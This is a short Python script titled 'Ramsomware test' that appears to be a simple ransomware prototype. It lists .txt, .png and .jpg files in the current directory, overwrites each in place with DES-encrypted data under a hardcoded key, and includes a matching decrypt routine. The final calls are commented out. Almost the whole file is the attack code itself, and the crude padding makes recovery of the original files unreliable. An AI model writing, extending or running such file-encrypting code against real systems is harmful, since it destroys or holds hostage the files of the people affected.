## Author: Mike16

import os
import sys 
try:
    from Crypto.Cipher import DES
except:
    print("You must install Crypto")

##################################################
print("Ramsomware test")

##################################################
files = [".txt", ".png", ".jpg"]

encryption = DES.new('12345678')

def searchDirectory():
    filesCurrentDirectory = os.listdir(os.getcwd()) #Change 
    filesSuccess = []
    for x in filesCurrentDirectory:
        for y in files:
            if x.find(y) != -1:
                filesSuccess.append(x)
                break

    return filesSuccess
    #cryptFiles(filesSuccess)

def cryptFiles(filesToCrypt):
    for x in filesToCrypt:
        data = ""
        with open(x, 'rb') as file:
            data = file.read()
            file.close()
        with open(x, 'wb') as file:
            while(len(data) % 8 != 0):
                data += str(1)
            dataCrypt = encryption.encrypt(data)
            file.write(dataCrypt)
            file.close()

def decryptFiles(filesToDecrypt):
    for x in filesToDecrypt:
        cryptData = ''
        with open(x, 'rb') as file:
            cryptData = file.read()
            file.close()
        with open(x, 'wb') as file:
            dataDecrypt = encryption.decrypt(cryptData)
            file.write(dataDecrypt)
    print("Done")

#cryptFiles(searchDirectory())
#decryptFiles(searchDirectory())



